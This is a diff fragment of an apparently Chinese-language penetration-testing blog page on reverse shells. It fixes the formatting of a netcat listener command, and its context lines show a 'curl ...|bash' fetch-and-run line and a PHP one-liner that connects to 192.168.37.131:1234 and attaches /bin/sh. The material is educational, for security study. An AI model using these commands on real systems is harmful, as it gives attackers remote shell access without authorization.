@@ -208,7 +208,7 @@ Content-Type: text/html; charset=utf-8&lt;/p&gt;
 &lt;p&gt;然后在目标机上执行如下，即可反弹 shell&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;curl Target_IP|bash&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id=&#34;php反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反弹shell&#34;&gt;#&lt;/a&gt; php 反弹 shell&lt;/h4&gt;
-&lt;p&gt;攻击机：・nc -nvlp Target_port`&lt;/p&gt;
+&lt;p&gt;攻击机：  &lt;code&gt;nc -nvlp Target_port&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;靶机：  &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;192.168.37.131&amp;quot;,1234);     exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id=&#34;others&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#others&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Others&lt;/strong&gt;&lt;/h4&gt;
 &lt;p&gt;反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。&lt;/p&gt;
